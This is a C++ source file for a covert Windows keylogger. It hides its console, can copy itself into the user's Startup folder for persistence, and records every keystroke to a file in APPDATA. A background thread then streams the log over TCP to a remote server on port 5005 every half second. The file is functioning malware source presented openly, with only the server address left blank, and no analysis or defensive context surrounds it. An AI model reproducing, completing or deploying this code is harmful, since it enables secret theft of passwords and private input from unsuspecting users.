#include <iostream>
#include <windows.h>
#include <fstream>
#include <thread>
using namespace std;

const string SERVER = "";
const int PORT = 5005;
const int SEND_DELAY = 500; // milliseconds

bool noConsole = true;
bool startup = false;

string logFileName = "keylogs.txt";
string appData = string(getenv("APPDATA")) + "\\";

// Register Keylogger to Startup Folder
void RegisterStartup(string fileName)
{
    string startupPath = "C:/Users/" + (string)getenv("USERNAME") + 
        "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";

    fileName.erase(fileName.length() - 4);
    fileName += ".exe";
    startupPath += fileName;

    ifstream clientFile(startupPath);
    if (!clientFile.is_open()) CopyFileA(fileName.data(), startupPath.data(), 0);
}

// Write Pressed Keys to File
void LogKey(char* key)
{
    ofstream keylogs(appData + logFileName, ios_base::app);
    keylogs << key;
    keylogs.close();
}

// Capture Clicked/Pressed Keys
bool captureKeys(int key)
{
    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {

         // Upper Case Keys
        switch (key)
        {
            case 0x41:
                LogKey((char*)"A");
                return true;
            case 0x42:
                LogKey((char*)"B");
                return true;
            case 0x43:
                LogKey((char*)"C");
                return true;
            case 0x44:
                LogKey((char*)"D");
                return true;
            case 0x45:
                LogKey((char*)"E");
                return true;
            case 0x46:
                LogKey((char*)"F");
                return true;
            case 0x47:
                LogKey((char*)"G");
                return true;
            case 0x48:
                LogKey((char*)"H");
                return true;
            case 0x49:
                LogKey((char*)"I");
                return true;
            case 0x4A:
                LogKey((char*)"J");
                return true;
            case 0x4B:
                LogKey((char*)"K");
                return true;
            case 0x4C:
                LogKey((char*)"L");
                return true;
            case 0x4D:
                LogKey((char*)"M");
                return true;
            case 0x4E:
                LogKey((char*)"N");
                return true;
            case 0x4F:
                LogKey((char*)"O");
                return true;
            case 0x50:
                LogKey((char*)"P");
                return true;
            case 0x51:
                LogKey((char*)"Q");
                return true;
            case 0x52:
                LogKey((char*)"R");
                return true;
            case 0x53:
                LogKey((char*)"S");
                return true;
            case 0x54:
                LogKey((char*)"T");
                return true;
            case 0x55:
                LogKey((char*)"U");
                return true;
            case 0x56:
                LogKey((char*)"V");
                return true;
            case 0x57:
                LogKey((char*)"W");
                return true;
            case 0x58:
                LogKey((char*)"X");
                return true;
            case 0x59:
                LogKey((char*)"Y");
                return true;
            case 0x5A:
                LogKey((char*)"Z");
                return true;
        }
    
    } else if (GetKeyState(VK_SHIFT) & 0x8000) {

        // [Shift] is pressed
        switch (key)
        {
            case 0x41:
                LogKey((char*)"A");
                return true;
            case 0x42:
                LogKey((char*)"B");
                return true;
            case 0x43:
                LogKey((char*)"C");
                return true;
            case 0x44:
                LogKey((char*)"D");
                return true;
            case 0x45:
                LogKey((char*)"E");
                return true;
            case 0x46:
                LogKey((char*)"F");
                return true;
            case 0x47:
                LogKey((char*)"G");
                return true;
            case 0x48:
                LogKey((char*)"H");
                return true;
            case 0x49:
                LogKey((char*)"I");
                return true;
            case 0x4A:
                LogKey((char*)"J");
                return true;
            case 0x4B:
                LogKey((char*)"K");
                return true;
            case 0x4C:
                LogKey((char*)"L");
                return true;
            case 0x4D:
                LogKey((char*)"M");
                return true;
            case 0x4E:
                LogKey((char*)"N");
                return true;
            case 0x4F:
                LogKey((char*)"O");
                return true;
            case 0x50:
                LogKey((char*)"P");
                return true;
            case 0x51:
                LogKey((char*)"Q");
                return true;
            case 0x52:
                LogKey((char*)"R");
                return true;
            case 0x53:
                LogKey((char*)"S");
                return true;
            case 0x54:
                LogKey((char*)"T");
                return true;
            case 0x55:
                LogKey((char*)"U");
                return true;
            case 0x56:
                LogKey((char*)"V");
                return true;
            case 0x57:
                LogKey((char*)"W");
                return true;
            case 0x58:
                LogKey((char*)"X");
                return true;
            case 0x59:
                LogKey((char*)"Y");
                return true;
            case 0x5A:
                LogKey((char*)"Z");
                return true;
            case 0xBB: // '='
                LogKey((char*)"+");
                return true;
            case 0xBC: // ','
                LogKey((char*)"<");
                return true;
            case 0xBE: // '.'
                LogKey((char*)">");
                return true;
            case 0xBD: // '-'
                LogKey((char*)"_");
                return true;
            case 0x30: // '0'
                LogKey((char*)")");
                return true;
            case 0x31: // '1'
                LogKey((char*)"!");
                return true;
            case 0x32: // '2'
                LogKey((char*)"@");
                return true;
            case 0x33: // '3'
                LogKey((char*)"#");
                return true;
            case 0x34: // '4'
                LogKey((char*)"$");
                return true;
            case 0x35: // '5'
                LogKey((char*)"%");
                return true;
            case 0x36: // '6'
                LogKey((char*)"^");
                return true;
            case 0x37: // '7'
                LogKey((char*)"&");
                return true;
            case 0x38: // '8'
                LogKey((char*)"*");
                return true;
            case 0x39: // '9'
                LogKey((char*)"(");
                return true;
        }

    } else if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0) {

        // Lower Case Keys
        switch (key)
        {
            case 0x41:
                LogKey((char*)"a");
                return true;
            case 0x42:
                LogKey((char*)"b");
                return true;
            case 0x43:
                LogKey((char*)"c");
                return true;
            case 0x44:
                LogKey((char*)"d");
                return true;
            case 0x45:
                LogKey((char*)"e");
                return true;
            case 0x46:
                LogKey((char*)"f");
                return true;
            case 0x47:
                LogKey((char*)"g");
                return true;
            case 0x48:
                LogKey((char*)"h");
                return true;
            case 0x49:
                LogKey((char*)"i");
                return true;
            case 0x4A:
                LogKey((char*)"j");
                return true;
            case 0x4B:
                LogKey((char*)"k");
                return true;
            case 0x4C:
                LogKey((char*)"l");
                return true;
            case 0x4D:
                LogKey((char*)"m");
                return true;
            case 0x4E:
                LogKey((char*)"n");
                return true;
            case 0x4F:
                LogKey((char*)"o");
                return true;
            case 0x50:
                LogKey((char*)"p");
                return true;
            case 0x51:
                LogKey((char*)"q");
                return true;
            case 0x52:
                LogKey((char*)"r");
                return true;
            case 0x53:
                LogKey((char*)"s");
                return true;
            case 0x54:
                LogKey((char*)"t");
                return true;
            case 0x55:
                LogKey((char*)"u");
                return true;
            case 0x56:
                LogKey((char*)"v");
                return true;
            case 0x57:
                LogKey((char*)"w");
                return true;
            case 0x58:
                LogKey((char*)"x");
                return true;
            case 0x59:
                LogKey((char*)"y");
                return true;
            case 0x5A:
                LogKey((char*)"z");
                return true;
        }
    }
    switch (key)
    {
        // Special Keys
        case VK_SPACE:
            LogKey((char*)" ");
            return true;
        case VK_BACK:
            LogKey((char*)"[Backspace]\n");
            return true;
        case VK_RETURN:
            LogKey((char*)"\n");
            return true;
        case VK_ESCAPE:
            LogKey((char*)"[Esc]\n");
            return true;
        case VK_TAB:
            LogKey((char*)"[Tab]\n");
            return true;
        case VK_CONTROL:
            LogKey((char*)"[Ctrl]\n");
            return true;
        case VK_DELETE:
            LogKey((char*)"[Del]\n");
            return true;
        case VK_END:
            LogKey((char*)"[End]\n");
            return true;

        // Function Keys
        case VK_F1:
            LogKey((char*)"[F1]");
            return true;
        case VK_F2:
            LogKey((char*)"[F2]");
            return true;
        case VK_F3:
            LogKey((char*)"[F3]");
            return true;
        case VK_F4:
            LogKey((char*)"[F4]");
            return true;
        case VK_F5:
            LogKey((char*)"[F5]");
            return true;
        case VK_F6:
            LogKey((char*)"[F6]");
            return true;
        case VK_F7:
            LogKey((char*)"[F7]");
            return true;
        case VK_F8:
            LogKey((char*)"[F8]");
            return true;
        case VK_F9:
            LogKey((char*)"[F9]");
            return true;
        case VK_F10:
            LogKey((char*)"[F10]");
            return true;
        case VK_F11:
            LogKey((char*)"[F11]");
            return true;
        case VK_F12:
            LogKey((char*)"[F12]");
            return true;

        // Number Keys
        case 0x30:
            LogKey((char*)"0");
            return true;
        case 0x31:
            LogKey((char*)"1");
            return true;
        case 0x32:
            LogKey((char*)"2");
            return true;
        case 0x33:
            LogKey((char*)"3");
            return true;
        case 0x34:
            LogKey((char*)"4");
            return true;
        case 0x35:
            LogKey((char*)"5");
            return true;
        case 0x36:
            LogKey((char*)"6");
            return true;
        case 0x37:
            LogKey((char*)"7");
            return true;
        case 0x38:
            LogKey((char*)"8");
            return true;
        case 0x39:
            LogKey((char*)"9");
            return true;

        // Punctuation Keys
        case 0xBB:
            LogKey((char*)"=");
            return true;
        case 0xBC:
            LogKey((char*)",");
            return true;
        case 0xBE:
            LogKey((char*)".");
            return true;
        case 0xBD:
            LogKey((char*)"-");
            return true;
        case 0x6F:
            LogKey((char*)"/");
            return true;
        default:
            return false;
    }
}

int SendLogs()
{
    string buffer, text;
    char bufsize[1024];
    int sender;

    WSADATA wsData;
    sockaddr_in client;
    SOCKET objSocket;

    if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) { return EXIT_FAILURE; }

    objSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (objSocket == SOCKET_ERROR) { return EXIT_FAILURE; }

    client.sin_family = AF_INET;
    client.sin_port = htons(PORT);
    client.sin_addr.s_addr = inet_addr(SERVER.c_str());
    if (connect(objSocket, (sockaddr*)&client, sizeof(client)) == SOCKET_ERROR) {
        closesocket(objSocket); WSACleanup(); SendLogs();
    }

    while (true)
    {
        ifstream LogFile(appData + logFileName);
        while (getline(LogFile, buffer)) { text += buffer + "\n"; }

        sender = send(objSocket, to_string(text.length()).data(), sprintf(bufsize, "%d", text.length()), 0);
        Sleep(200);
        sender = send(objSocket, text.c_str(), text.length(), 0);

        if (sender == 0 or sender == SOCKET_ERROR) {
            closesocket(objSocket); WSACleanup(); SendLogs();
            
        } text.clear(); buffer.clear();
        
        Sleep(SEND_DELAY);
    }
}

int main()
{
    if (noConsole) FreeConsole(); // Disable Terminal Pop-Up
    if (startup) RegisterStartup(__FILE__); // Register to Startup Folder

    thread t(SendLogs);
    t.detach();

    while (true)
    {
        for (int key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767) {
                if (captureKeys(key) == false) {
                    continue;
                }
            }
        }
    }
}
